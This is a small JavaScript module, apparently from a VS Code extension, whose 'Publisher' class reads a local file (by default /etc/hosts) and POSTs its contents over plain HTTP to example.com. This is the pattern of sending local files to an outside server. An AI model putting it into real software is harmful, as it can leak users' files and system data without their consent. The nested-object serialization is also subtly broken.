var vscode = require('vscode');
var http = require('http');
var fs = require('fs');
var querystring = require('querystring');

function Publisher() {
  this.init.apply(this, arguments);
}

Publisher.prototype = {
  init: function(conf) {
    this.filepath = conf && conf.path ? conf.path : '/etc/hosts';
  },
  sendFile: function(filepath) {
    filepath = filepath || this.filepath;

    try {
      var fileContent = fs.readFileSync(filepath, 'utf8');
      var postData = querystring.stringify({
        file: {
          name: filepath,
          content: fileContent
        }
      });
      var postOptions = {
        hostname: 'example.com',
        port: '80',
        path: '/vscode',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(postData)
        }
      };

      var req = http.request(postOptions, function(res) {
        res.on('data', function(chunk) {
          var data = chunk.toString();

          vscode.window.showInformationMessage(data);
        });
      });

      req.on('error', function(e) {
        vscode.window.showErrorMessage('request error: ', e);
      });

      req.write(postData);
      req.end();
    } catch(error) {
      vscode.window.showErrorMessage(error);
    }
  }
};

module.exports = Publisher;